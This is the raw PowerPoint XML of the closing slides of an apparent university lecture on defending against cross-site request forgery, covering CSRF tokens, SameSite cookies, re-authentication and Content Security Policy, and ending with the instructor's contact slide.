            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3090197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675807-06BB-CF40-92A5-B64477A0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14</a:t>
            </a:fld>
            <a:endParaRPr lang="zh-CN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908AC0-6F1E-BA40-925E-A4F92673830C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2364987" y="1317238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 CSRF token is a unique, unpredictable value included in requests to verify the request authenticity.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4067424-999E-2445-ABC0-80EDC3E84EAE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2364987" y="2480013"/>
            <a:ext cx="4953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dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> cookie attribute prevents browsers from sending cookies in cross-site requests.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18931A-313D-6E47-9928-C2A062A3FEC0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2364987" y="3642788"/>
            <a:ext cx="4953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Force users to enter their password or use multi-factor authentication (MFA) before performing critical actions (e.g., money transfer, password change).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E4598B5-AA38-0E4D-B9C3-E88C2FEA26EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2364987" y="5082562"/>
            <a:ext cx="40543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Enable Content Security Policy (CSP)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1C08C-35AD-9540-94EA-018B3BFFBECB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="178419" y="412686"/>
            <a:ext cx="385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to Tackle CSRF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1846233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2675807-06BB-CF40-92A5-B64477A06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58AAF-F958-4141-BDE8-5609689A4508}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:t>15</a:t>
            </a:fld>
            <a:endParaRPr lang="zh-CN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6F1C08C-35AD-9540-94EA-018B3BFFBECB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="178419" y="412686"/>
            <a:ext cx="38583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How to Tackle CSRF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C3C3E04-79B9-564C-AB68-BD594D2CAB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15136" y="1228164"/>
            <a:ext cx="5080000" cy="2895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694622D-53D9-F34F-A6A3-2543EE8E7C7C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="178419" y="1152461"/>
            <a:ext cx="3858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SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> Cookie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551E716-3358-184A-A9AD-A823673219AE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="604669" y="4285129"/>
            <a:ext cx="770023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err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:latin typeface="Google Sans"/>
              </a:rPr>
              <a:t>SameSite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 cookie attributes (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Strict``Lax``None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) prevent </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A0DAB"/>
                </a:solidFill>
                <a:latin typeface="Google Sans"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>Cross-Site Request Forgery (CSRF)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by controlling if browsers send cookies with cross-site requests. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Lax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(default) allows cookies on top-level navigation (e.g., links)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Strict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limits them to the same domain, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>None</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:latin typeface="Google Sans"/>
              </a:rPr>
              <a:t> allows third-party context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951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0"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="114796" y="177016"/>
            <a:ext cx="8819139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SimSun" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="base" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" i="1" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:cs typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" i="1" dirty="0">
                <a:ea typeface="Adobe Gothic Std B" pitchFamily="34" charset="-128"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="Adobe Gothic Std B" pitchFamily="34" charset="-128"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7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7460456" y="6394451"/>
            <a:ext cx="2228850" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{48758AAF-F958-4141-BDE8-5609689A4508}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" smtClean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16</a:t>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg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156812" y="1967221"/>
            <a:ext cx="4934499" cy="9949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US" sz="3600" dirty="0">
                <a:latin typeface="Calibri" panose="020F050202020403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it-IT" sz="3600" dirty="0">
              <a:latin typeface="Calibri" panose="020F050202020403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lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="accent5"/>
              </a:buClr>
              <a:buSzPct val="75000"/>
            </a:pP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8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B50F3C67-F206-0644-9881-E95BE68F9B62}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="704879" y="2383536"/>
            <a:ext cx="7870002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Questions??</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="矩形 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{64398696-03BA-0540-B525-6DD16F72E4B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="114796" y="3320635"/>
            <a:ext cx="7209544" cy="5207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5000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="accent5"/>
              </a:buClr>
              <a:buSzPct val="75000"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>			</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>zubair.ahmad@giki.edu.pk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill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E4CAA-2776-8148-9C8F-90037E259AAF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2743200" y="4522362"/>
            <a:ext cx="39832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Office: G14 FCSE lobby</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1935760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3343549</TotalTime>
  <Words>767</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>A4 Paper (210x297 mm)</PresentationFormat>
  <Paragraphs>88</Paragraphs>
  <Slides>16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9" baseType="lpstr">
      <vt:lpstr>Adobe Gothic Std B</vt:lpstr>
      <vt:lpstr>AGaramondPro</vt:lpstr>
      <vt:lpstr>ArialMT</vt:lpstr>
      <vt:lpstr>等线</vt:lpstr>
      <vt:lpstr>等线</vt:lpstr>
      <vt:lpstr>等线 Light</vt:lpstr>
      <vt:lpstr>Google Sans</vt:lpstr>
      <vt:lpstr>SimSun</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Times New Roman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China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</dc:creator>
  <cp:lastModifiedBy>Microsoft Office User</cp:lastModifiedBy>
  <cp:revision>815</cp:revision>
  <cp:lastPrinted>2025-03-10T09:35:17Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2018-07-17T04:46:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-11T11:39:51Z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2052-11.1.0.8567</vt:lpwstr>
  </property>
</Properties>
</file>